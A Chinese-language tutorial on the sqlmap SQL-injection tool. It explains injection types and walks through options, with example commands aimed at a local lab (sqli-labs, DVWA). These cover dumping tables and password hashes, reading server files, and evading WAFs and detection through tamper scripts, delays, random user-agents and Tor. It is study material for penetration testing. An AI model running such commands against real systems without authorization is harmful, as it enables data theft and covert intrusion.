# Sqlmap入门

参考:

https://github.com/sqlmapproject/sqlmap/wiki/Usage

https://www.kanxue.com/book-6-110.htm

## 原理

在owasp发布的top10 漏洞里面，注入漏洞一直是危害排名第一，其中数据库注入漏洞是危害的。

当攻击者发送的sql语句被sql解释器执行，通过执行这些恶意语句欺骗数据库执行，导致数据库信息泄漏

## 分类

### 按注入类型

常见的sql注入按照参数类型可分为两种：数字型和字符型

当发送注入点的参数为整数时，比如ID，num，page等，这种形式的就属于数字型注入漏洞。同样，当注入点是字符串时，则称为字符型注入，字符型注入需要引号来闭合

### 按返回结果

- 回显注入：可以直接在存在注入点的当前页面中获取返回结果。

- 报错注入：程序将**数据库的返回错误信息**结果直接显示在页面中，虽然没有返回数据库查询的结果，但是可以构造一些报错语句从错误信息中获取想要的结果。

- 盲注：程序后端屏蔽了数据库的错误信息，没有直接显示结果也没有显示数据库报错信息，只能通过数据库的逻辑和延时函数来判断注入的结果。根据表现形式的不同，盲注又分为based boolean(返回结果只有对与错) 和 based time(由返回结果的时间判断) 两种

  ```sql
  select IF(ASCII(SUBSTR(DATABASE(),1,1))>97, 1, SLEEP(3))
  ```

### 按注入位置与方式

按照注入位置及方式可分为：post注入，get注入，cookie注入，盲注，延时注入，搜索注入，base64注入，无论分类如何，都可以归纳为以上两种形式

> 使用Mybatis的预先编译即可很好的预防sql注入
>

## Sqlmap概述

> --wizard            Simple wizard interface for beginner users
>
> -- sqlmap-shell      Prompt for an interactive sqlmap shell
>
> 使用--sqlmap-shell无需每次输入sqlmap

## 概述

- 支持六种sql注入

  - boolean-base blind：基于布尔的盲注，即可以根据返回页面判断条件真假的注入

  - time-base blind：基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断

    ```sql
    select IF(ASCII(SUBSTR(DATABASE(),1,1))>97, 1, SLEEP(3))
    ```

    如果库名的第一个字母大于a，返回1否则sleep 3 sec

  - error-based：基于报错注入，即页面会返回错误信息，或则把注入的语句的结果直接返回在页面种

  - UNION query-based：联合查询注入，可以使用union的情况下的注入；

  - stacked queries and out-of-band：堆查询注入，可以同时执行多条语句的执行时的注入。

## Options

- ` -h, --help            Show basic help message and exit`

  显示基本的帮助命令

- ` -hh                   Show advanced help message and exit`

  显示高级的帮助命令

- ` --version             Show program's version number and exit`

  显示sqlmap version

- ` -v VERBOSE            Verbosity level: 0-6 (default 1)`

  以verbose的形式输出结果
  
  - **0**: Show only Python tracebacks, error and critical messages.
  - **1**: Show also information and warning messages.
  - **2**: Show also debug messages.
  - **3**: Show also payloads injected.
  - **4**: Show also HTTP requests.
  - **5**: Show also HTTP responses' headers.
  - **6**: Show also HTTP responses' page content.

```
sqlmap -d "mysql://root:12345@192.168.80.129:3306/mysql" -v3
```



## Target

==必须要指定一个target==

- `-d DIRECT           Connection string for direct database connection`

  与数据库直连，需要该数据库的账户和密码，以及数据库的远程访问权限

  Pattern:

  `sqlmap -d DBMS://username:passwd@DBMS_HOST:PORT/database`

  Example:

  ```
  sqlmap -d "mysql://root:12345@192.168.80.129:3306/mysql"
  ```

- `-u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")`

  与URL连接，如果以默认的80端口或是443对外开放web服务无需添加端口

- `-l LOGFILE          Parse target(s) from Burp or WebScarab proxy log file`

  使用burpsuite的request log 做为参数, 需要在burp中设置记录日志

<img src="..\..\..\imgs\_Kali\sqlmap\Snipaste_2020-09-12_19-36-00.png"/>

  ```
  sqlmap -l filename
  ```

- `-m BULKFILE         Scan multiple targets given in a textual file`

  使用文本文件, 我们有文件url.txt 内容如下

  ```txt
    www.target1.com/vuln1.php?q=foobar
    www.target2.com/vuln2.asp?id=1
    www.target3.com/vuln3/id/1*
  ```

  然后可用使用如下命令让Sqlmap测试这些URL是否存在注入漏洞：

  ```
  sqlmap -m  url.txt
  ```

- `-r REQUESTFILE      Load HTTP request from a file`

  可以将一个HTTP请求保存在文件中，然后使用参数“-r”加载该文件，Sqlmap会解析该文件，从该文件分析目标并进行测试。

  设有如下所示的HTTP请求保存在文件get.txt中：

  ```
    GET /user.php?id=1 HTTP/1.1
    Host: 192.168.56.101:8080
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-SG,en-US;q=0.7,en;q=0.3
    Accept-Encoding: gzip, deflate
    DNT: 1
    Connection: close
    Upgrade-Insecure-Requests: 1123456789
  ```

  则使用如下命令让Sqlmap解析该文件，以该文件中HTTP请求目标为攻击目标进行测试：

  ```
    python sqlmap.py -r get.txt
  ```

- `-g GOOGLEDORK       Process Google dork results as target URLs`

  使用谷歌特殊查询做为参数

  ```
  sqlmap -g "inurl:.php?id=1
  ```

- `-c CONFIGFILE       Load options from a configuration INI file`

  使用INI配置文件做为参数

## Request

==决定怎么连接target==

- `--method=METHOD     Force usage of given HTTP method (e.g. PUT)`

  一般来说，Sqlmap能自动判断出是使用GET方法还是POST方法，但在某些情况下需要的可能是PUT等很少见的方法

  ```
  sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1" --method=put
  ```

- `--data=DATA         Data string to be sent through POST (e.g. "id=1")`

  做为post的参数，当有多个参数时，使用&拼接。

  这里我们先用burpsuite拦截请求，查看post的参数

<img src="..\..\..\imgs\_Kali\sqlmap\Snipaste_2020-09-13_11-43-30.png"/>

  由此发现参数分别是uname，passwd，submit

  ```shell
  sqlmap -u "http://192.168.80.129/sqli/Less-11/" --data="uname=123&passwd=123&submit=Submit" 
  ```

<img src="..\..\..\imgs\_Kali\sqlmap\Snipaste_2020-09-13_11-52-03.png"/>

  通过sqlmap获取到注入的sql，通过burp可以校验

<img src="..\..\..\imgs\_Kali\sqlmap\Snipaste_2020-09-13_11-53-55.png"/>

- `--param-del=PARA..  Character used for splitting parameter values (e.g. &)`

  通过`--param-del=";"`来指定delimeter

  ```shell
  sqlmap -u "http://localhost/dvwa/vulnerabilities/brute/" --data="username=admin；password=password" --param-del=";"
  ```

### http-headers

> sqlmap如果请求需要cookie， sqlmap需要手动设置cookie值。
>
> 指定--level >=2 检测cookie是否有sql注入

- `--cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")`

  当检测需要使用cookie时，使用`--cookie`。默认使用分号分隔，可以通过`--cookie-del`来指定分隔符
  
  ```
  sqlmap -u "http://192.168.80.129/dvwa/vulnerabilities/sqli_blind/#" --data="id=2&Submit=Submit" --cookie="security=medium; PHPSESSID=psraicopdtede7ok52erpr08bo"
  ```

- ` --load-cookies=L..  File containing cookies in Netscape/wget format`

  从文件中载入Netscape或wget格式的cookie

- ` --drop-set-cookie   Ignore Set-Cookie header from response`

  将响应体中的cookie丢弃

> 指定--level >=3 检测user-agent是否有sql注入

- `--user-agent=AGENT  HTTP User-Agent header value`

  设置请求头中`user-agent`。默认使用` sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org)`做为User-Agent

- ` --random-agent      Use randomly selected HTTP User-Agent header value`

  从usr/share/sqlmap/data/txt/user-agents.txt中随机取出一个User-Agent。注意，在一次会话中只是用同一个User-Agent，并不是每发一个HTTP请求包，都随机一个User-Agent。==起到反检测的作用==

  ```
  sqlmap -u "http://192.168.80.129/dvwa/vulnerabilities/sqli_blind/#" --data="id=2&Submit=Submit" --drop-set-cookie --random-agent
  ```

  使用了user-agent

<img src="..\..\..\imgs\_Kali\sqlmap\Snipaste_2020-09-13_21-09-32.png"/>

  未使用user-agent

<img src="..\..\..\imgs\_Kali\sqlmap\Snipaste_2020-09-13_21-11-22.png"/>

  

> 指定--level >= 5 检测host是否存在sql注入

- `--host=HOST         HTTP Host header value`

  指定请求头中的HOST

<img src="..\..\..\imgs\_Kali\sqlmap\Snipaste_2020-09-13_21-26-08.png"/>

> 指定--level>=3 检测referer是否存在sql注入

- ` --referer=REFERER   HTTP Referer header value`

  ==指定请求头中referer，用来伪造请求参数==

- ` -H HEADER, --hea..  Extra header (e.g. "X-Forwarded-For: 127.0.0.1")`

  指定额外单一的请求头，如token

  ` --headers=HEADERS   Extra headers (e.g. "Accept-Language: fr\nETag: 123")`

  ==指定多个请求头，需要使用\n换行==

  ```
  sqlmap -u "http://192.168.80.129/sqli/Less-3/?id=1" --banner -headers="token:123\n config:abc"
  ```

<img src="..\..\..\imgs\_Kali\sqlmap\Snipaste_2020-09-13_21-50-48.png"/>

- `--auth-type=AUTH..  HTTP authentication type (Basic, Digest, NTLM or PKI)`

  指定认证的方式

- `--auth-cred=AUTH..  HTTP authentication credentials (name:password)`

  指定认证的用户名和密码

### proxy

- ` --proxy=PROXY       Use a proxy to connect to the target URL`

  指定代理，用于隐藏真实IP

  ```
  sqlmap -u "http://192.168.80.129/sqli/Less-3/?id=1" --proxy="http://192.168.80.1:80"
  ```

- `--proxy-file=PRO..  Load proxy list from a file`

  使用文件中的代理

- `--tor               Use Tor anonymity network`

  使用tor匿名网络

- `  --tor-type=TORTYPE  Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default))`

  指定代理的模式，默认使用SOCKS5

### action

- ` --ignore-code=IG..  Ignore (problematic) HTTP error code (e.g. 401)`

  忽略对指定status code的响应

  ```
  sqlmap -u "http://192.168.80.129/sqli/Less-3/?id=1"  --ignore-code=401
  
  ```

- `--delay=DELAY       Delay in seconds between each HTTP request`

  ==设置每次请求之间的间隔，可以有效躲避检测==

  ```
  sqlmap -u "http://192.168.80.129/sqli/Less-3/?id=1" --delay=1
  
  ```

- ` --timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)`

  设置连接的超时时间

- `  --retries=RETRIES   Retries when the connection timeouts (default 3)`

  设置重试次数

- `   --randomize=RPARAM  Randomly change value for given parameter(s)`

  随机生成HTTP请求中的参数，这里表示随机生成id，可以避免触发安全机制

  ```
  sqlmap -u http://192.168.80.129/sqli/Less-3/?id=1 --randomize=id
  ```

- `--safe-url=SAFEURL  URL address to visit frequently during testing`

  ` --safe-post=SAFE..  POST data to send to a safe URL`

  `--safe-req=SAFER..  Load safe HTTP request from a file`

  `--safe-freq=SAFE..  Test requests between two visits to a given safe URL`

  有时服务器检测到某个客户端错误请求过多会对其进行屏蔽，而Sqlmap的测试往往会产生大量的错误请求，为避免被屏蔽，可以是不是产生几个正常的请求以迷惑服务器。这里所谓的安全URL是指访问会返回200、没有任何报错的URL。相应地，==Sqlmap也不会对安全URL进行任何注入测试。==

- ` --force-ssl         Force usage of SSL/HTTPS`

  强制使用SSL通道

## Optimization

 These options can be used to optimize the performance of sqlmap

可以加快sqlmap的探测速度

- `-o                  Turn on all optimization switches`

  使用所有的加快探测速度的手段

<img src="..\..\..\imgs\_Kali\sqlmap\Snipaste_2020-09-14_13-38-24.png"/>

- `--keep-alive        Use persistent HTTP(s) connections`

  设置连接为长连接，默认使用Close，连接一次就会关闭

<img src="..\..\..\imgs\_Kali\sqlmap\Snipaste_2020-09-14_12-43-58.png"/>

- `--threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)`

  设定并发的线程

- `--predict-output    Predict common queries output`

  预测输出，与`--thread`不兼容

- ` --null-connection   Retrieve page length without actual HTTP response body`

<img src="..\..\..\imgs\_Kali\sqlmap\Snipaste_2020-09-14_12-42-08.png"/>

  返回Content-length，不接收ResponseBody

## Injection

These options can be used to specify which parameters to test for, provide custom injection payloads and optional tampering scripts

用于指定检测的参数, 客制化payload

- `-p TESTPARAMETER    Testable parameter(s)`

  指定需要探测的参数或是报文头，当有多个参数时使用逗号分隔

  ```
  sqlmap -u "http://192.168.80.129/sqli/Less-1/?id=1&name=chz&pwd=123" -p "id,pwd" -o  --current-db
  ```

  ==同样也可以指定user-agent==

  ```
  sqlmap -u "http://192.168.80.129/sqli/Less-1/?id=1&name=chz&pwd=123" -p user-agent -o  --current-db
  ```

- `--skip=SKIP         Skip testing for given parameter(s)`

  不探测指定的参数

- `--skip-static       Skip testing parameters that not appear to be dynamic`

  跳过非动态的参数探测

- `--param-exclude=..  Regexp to exclude parameters from testing (e.g. "ses")`

  使用正则排除

  ```
  sqlmap -u http://192.168.80.129/sqli/Less-1/?id"=1&name=chz&pwd=123" --param-exclude="Cache.*" -o
  ```

- `--dbms=DBMS         Force back-end DBMS to provided value`

  指定DBMS，如Oracle，MySQL。会自动识别

  ```
  sqlmap -u http://192.168.80.129/sqli/Less-1/?id"=1&name=chz&pwd=123"  -o --dbms="MySQL"
  ```

- ` --os=OS             Force back-end DBMS operating system to provided value`

  指定操作系统，如windows，linux。会自动识别

- `--invalid-bignum    Use big numbers for invalidating values`

  `--invalid-logical   Use logical operations for invalidating values`

  `--invalid-string    Use random strings for invalidating values`

  用大的数据做为注入的无效参数

  在sqlmap需要使原始参数值无效（例如id=12）时，它使用经典的否定（例如id=-13）。有了这个开关，就可以强制使用指定的来替换该错误参数

- ` --prefix=PREFIX     Injection payload prefix string`
   `  --suffix=SUFFIX     Injection payload suffix string`

  使用指定的前后缀来修饰payload

- `--no-escape         Turn off string escaping mechanism`

  有时Sqlmap会使用用单引号括起来的字符串值作为payload，如“SELECT ‘foobar’”，默认地这些值会被编码，如上例将被编码为：
  “SELECT CHAR(102)+CHAR(111)+CHAR(111)+CHAR(98)+CHAR(97)+CHAR(114))”。这样做既可以混淆视听让人一时难以洞察payload的内容又可以在后台服务器使用类似magic_quote或mysql_real_escape_string这样的转义函数的情况下字符串不受影响。当然在某些情况下需要关闭字符串编码，如为了缩减payload长度，用户可以使用“–no-escape”来关闭字符串编码。

- `--tamper=TAMPER     Use given script(s) for tampering injection data`

  除了用CHAR()编码字符串外Sqlmap没有对payload进行任何混淆。
  该参数用于对payload进行混淆以绕过IPS或WAF。
  该参数后跟一个tamper脚本的名字。若该tamper脚本位于sqlmap的安装目录的tamper/目录中，就可以省略路径和后缀名，只写文件名。
  多个tamper脚本之间用空格隔开。

  ```
  sqlmap -u http://192.168.80.129/sqli/Less-1/?id"=1&name=chz&pwd=123"  --tamper=space2comment.py
  ```

## Detection

 These options can be used to customize the detection phase

- `--level=LEVEL       Level of tests to perform (1-5, default 1)`

  设置探测等级

  > GET and POST parameters are **always** tested, HTTP Cookie header values are tested from level **2** and HTTP User-Agent/Referer headers' value is tested from level **3**.

- `--risk=RISK         Risk of tests to perform (1-3, default 1)`

  设置风险等级

## Techniques

These options can be used to tweak testing of specific SQL injection techniques

- `--technique=TECH    SQL injection techniques to use (default "BEUSTQ")`

  指定使用什么类型的SQL注入来探测，默认使用所有

  1. `B`: Boolean-based blind
  2. `E`: Error-based
  3. `U`: Union query-based
  4. `S`: Stacked queries
  5. `T`: Time-based blind
  6. `Q`: Inline queries

  ```
  sqlmap -u "http://192.168.80.129/sqli/Less-1/?id=1" --technique=ES
  ```

- `--time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)`

  指定基于时间的盲注的sleep时间

## Fingerprint

- ` -f, --fingerprint   Perform an extensive DBMS version fingerprint`

  获取DBMS的版本信息

## Enumeration

These options can be used to enumerate the back-end database management system information, structure and data contained in the tables. Moreover you can run your own SQL statements.

额外条件`-D`，`-T`，`-C`，`--start`，`--stop`

枚举数据库中信息

- `-a, --all           Retrieve everything`

<img src="..\..\..\imgs\_Kali\sqlmap\Snipaste_2020-09-14_16-20-57.png"/>

  同时还可以获取账户密码的Hash ，也包括解码一些常见的明文密码

<img src="..\..\..\imgs\_Kali\sqlmap\Snipaste_2020-09-14_16-23-26.png"/>

- ` -b, --banner        Retrieve DBMS banner`

  获取数据库的bann信息

- `--current-user      Retrieve DBMS current user`

  获取数据库当前的用户

- `--hostname          Retrieve DBMS server hostname`

  获取主机名

- ` --users             Enumerate DBMS users`

  获取所有用户名

- `--privileges        Enumerate DBMS users privileges`

  获取用户权限，使用`-U`指定用户

- `--passwords         Enumerate DBMS users password hashes`

  获取密码哈希值以及解密，使用`-U`指定用户

  ```
  sqlmap -u "http://192.168.80.129/sqli/Less-1/?id=1" -o --password -U root
  ```

  可以使用如下格式尝试登入数据库，==需要远程登入授权才能登入==

  ```
  mysql -h 192.168.80.129 -u root -p
  ```

- `--dbs               Enumerate DBMS databases`

  获取所有的数据库

- `--tables            Enumerate DBMS database tables`

  如果没有指定 `-D`，==枚举所有数据库中所有表==。使用`--exclude-sysdbs`来排除系统的表

- `--columns           Enumerate DBMS database table columns`

  通过`-D`指定DB，==如果没有指定DB就使用当前探测的数据库==；使用`-T`指定table，如果没有指定查询所有table的字段以及类型；使用`-C`指定查询某一列

  ```
  sqlmap -u "http://192.168.80.129/sqli/Less-1/?id=1" -o --columns -D mysql
  ```

- ` --schema            Enumerate DBMS schema`

  列出所有的数据库，表名，字段名，字段类型。使用`--exclude-sysdbs`排除系统数据库

- `--dump              Dump DBMS database table entries`

  获取表中的详细信息，==并存储到本地==

  ```
  sqlmap -u "http://192.168.80.129/sqli/Less-1/?id=1" --dump -D security -T users 
  ```

<img src="..\..\..\imgs\_Kali\sqlmap\Snipaste_2020-09-14_17-33-26.png"/>

  ==可以使用`-D`，`-T`，`-C`; 还可以使用`--start`和`--stop`查询指定行数, 起到分页查询的功能==

  ```
  sqlmap -u "http://192.168.80.129/sqli/Less-1/?id=1" --dump -D security -T users --start 1 --stop 2
  ```

- `--dump-all          Dump all DBMS databases tables entries`

  一次性存储所有数据库中的所有表，可以和`--exclude-sysdbs`一起使用

- `--search            Search column(s), table(s) and/or database name(s)`

  所属指定的库名，表名，列名，可以采用模糊匹配。需要配合`-D`,`-T`，`-C`一起使用

  ```
  sqlmap -u "http://192.168.80.129/sqli/Less-1/?id=1" --search -D security -C "pass,name"
  ```

  多个参数时使用逗号隔开

- `--sql-shell         Prompt for an interactive SQL shell`

  ==以shell的格式，连接当前被探测的数据库，可以使用MySQL语法==

## Brute force

- `--common-tables     Check existence of common tables`

  如果`--tables`不能获取信息，需要采用该命令。通常由于以下几点造成

  - The database management system is MySQL **< 5.0** where `information_schema` is not available.
  - The database management system is Microsoft Access and system table `MSysObjects` is not readable - default setting.
  - The session user does not have read privileges against the system table storing the scheme of the databases.

- `--common-columns    Check existence of common columns`

  as mentioned before

> File system access / Operating system access / Windows registry access
>
> 需要设置数据库的secure-file-priv, 并且当前注入的数据的DBA有写入文件的权限

在mysql的配置文件中添加`secure_file_priv=/`

## File system access

 These options can be used to access the back-end database management system underlying file system

读取后端目标及中的文件

- `--file-read=FILE..  Read a file from the back-end DBMS file system`

  ```
  sqlmap -u "http://192.168.80.129/sqli/Less-7/?id=1" --file-read="d://test.txt" --technique=BEU
  ```

- `--file-write=FIL..  Write a local file on the back-end DBMS file system`

  `--file-dest=FILE..  Back-end DBMS absolute filepath to write to`

  ```
  
  ```

##  Operating system access



## Windows registry access

## General

These options can be used to set some general working parameters

设置通用参数

> sqlmap第一次查询target时，会将结果缓存到session文件中，后面再次查询时就直接从session文件中获取结果

- `-s SESSIONFILE      Load session from a stored (.sqlite) file`

  加载一个SESSIONFILE，文件通常存储在`~/.local/share/sqlmap/output/192.168.80.129`

  ```
  qlmap -u "http://192.168.80.129/sqli/Less-1/?id=1" -s ~/.local/share/sqlmap/output/192.168.80.129/session.sqlite 
  ```

  能跳过检测，直接给出检测结果。

- `-t TRAFFICFILE      Log all HTTP traffic into a textual file`

  把所有的HTTP（s）流量存入日志中，主要用于调试目的

  ```
  sqlmap -u "http://192.168.80.129/sqli/Less-1/?id=1" -t /root/Desktop/target.txt
  ```

- `--batch             Never ask for user input, use the default behavior`

  ==使用默认做为选项==

- ` --charset=CHARSET   Blind SQL injection charset (e.g. "0123456789abcdef")`

  使用指定的字符集

  ```
  sqlmap -u "http://192.168.80.129/sqli/Less-1/?id=1" --charset="123456789qazwsxedcrfv"
  ```

- `--crawl=CRAWLDEPTH  Crawl the website starting from the target URL`

  爬取指定url所有的子url, 并对他们进行sql注入检测

  ```
  sqlmap -u "http://192.168.80.129/sqli" --crawl=3 --batch 
  ```

  由于访问所有url，就不需要通过url指定注入点

- `--forms             Parse and test forms on target URL`

  检查请求是否以表单提交，并检测sql注入

  ```
  sqlmap -u "http://192.168.80.129/sqli/Less-11?id=12" --forms
  ```

- `--eta               Display for each output the estimated time of arrival`

  用于输出展示，数据库内容的进度条

  ```
  sqlmap -u "http://192.168.80.129/sqli/Less-1?id=12" -D security -T users --dump --fresh-queries --batch --eta
  ```

- `--flush-session     Flush session files for current target`

  ==无视session文件的结果，重新进行检测注入点==

- ` --fresh-queries     Ignore query results stored in session file`

  ==无视session文件的结果，重新检查数据库==

- `--parse-errors      Parse and display DBMS error messages from responses`

  显示插入payload时，数据库中返回的错误信息

- `--save=SAVECONFIG   Save options to a configuration INI file`

  将当前执行的命令存储成配置文件，下次可以通过`-c`参数来调用

  ```
  sqlmap -u "http://192.168.80.129/sqli/Less-2/?id=1" --save="/root/Desktop/temp.txt"
  sqlmap -c "root/Desktop/temp.txt"
  ```

- `--har=HARFILE       Log all HTTP traffic into a HAR file`

  将所有的请求和响应存储成json格式

  ```
  sqlmap -u "http://192.168.80.129/sqli/Less-2/?id=1" --har="/root/Desktop/temp.har"
  ```

## Miscellaneous

杂项

- `--cleanup           Clean up the DBMS from sqlmap specific UDF and table`

  清除sqlmap入侵后端后留下临时表或udf，==强烈推荐==

- `--list-tampers      Display list of available tamper scripts`

  列出所有的tamper脚本

  ```
  sqlmap --list-tampers
  ```

- `--mobile            Imitate smartphone through HTTP User-Agent header`

  模仿手机的HTTP user-agent

<img src="..\..\..\imgs\_Kali\sqlmap\Snipaste_2020-09-14_23-48-37.png"/>

- `--identify-waf      Make a thorough testing for a WAF/IPS protection`

  检测数据库服务器有无使用WAF

- `--skip-waf          Skip heuristic detection of WAF/IPS protection`

  ==绕过waf==

  ```
  sqlmap -u "http://192.168.80.129/sqli/Less-7/?id=1" --skip-waf
  ```

  



















